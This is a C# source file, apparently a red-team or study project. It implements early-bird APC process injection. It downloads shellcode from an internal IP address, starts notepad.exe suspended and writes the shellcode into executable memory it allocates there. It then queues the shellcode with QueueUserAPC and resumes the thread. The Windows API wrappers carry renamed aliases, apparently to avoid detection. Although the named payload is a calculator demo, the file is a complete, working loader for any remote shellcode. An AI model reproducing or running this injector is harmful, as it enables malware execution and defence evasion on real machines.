using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace ProcessInjectorNonStandard
{
    internal class Program
    {
        static void Main()
        {
            //Download shellcode
            WebClient client = new WebClient();
            client.BaseAddress = "http://192.168.100.52";
            byte[] shellcode = client.DownloadData("calc.bin");

            //Initialize structs
            var startup_info = new WinApi.STARTUPINFO();
            var proc_attributes = new WinApi.SECURITY_ATTRIBUTES();
            var thread_attributes = new WinApi.SECURITY_ATTRIBUTES();
            var proc_info = new WinApi.PROCESS_INFORMATION();

            //Initialize vars
            startup_info.cb = Marshal.SizeOf(startup_info);
            proc_attributes.nLength = Marshal.SizeOf(proc_attributes);
            thread_attributes.nLength = Marshal.SizeOf(thread_attributes);

            //create suspended process
            uint create_suspended = 0x00000004;

            bool success = WinApi.PStart(
                    "C:\\Windows\\System32\\notepad.exe",
                    null,
                    ref proc_attributes,
                    ref thread_attributes,
                    false,
                    create_suspended,
                    IntPtr.Zero,
                    "C:\\Windows\\System32",
                    ref startup_info,
                    out proc_info
                );

            if (!success)
            {
                Console.WriteLine("Error when starting process");
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }
            else 
            {
                Console.WriteLine($"Process created with PID {proc_info.dwProcessId}");
                var proc = Process.GetProcessById(proc_info.dwProcessId);
                
                Console.WriteLine("Trying to allocate memory in the process");
                IntPtr sweet_space = WinApi.Alloc(proc.Handle, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
                
                Console.WriteLine("Writing the shellcode into the allocated memory");
                uint oout;
                bool status = WinApi.Writer(proc.Handle, sweet_space, shellcode, (uint)shellcode.Length, out oout);
                if (!status) 
                {
                    Console.WriteLine("Writing shellcode failed");
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }

                //It would seem that a call to VirtualProtectEx is not needed ?

                //Call QueueUserAPC API
                Console.WriteLine("Calling QueueUserAPC API");
                WinApi.APC(sweet_space, proc_info.hThread, 0);

                Console.WriteLine("Trying to resume the process's thread");
                WinApi.Resume(proc_info.hThread);
            }
        }
    }
}
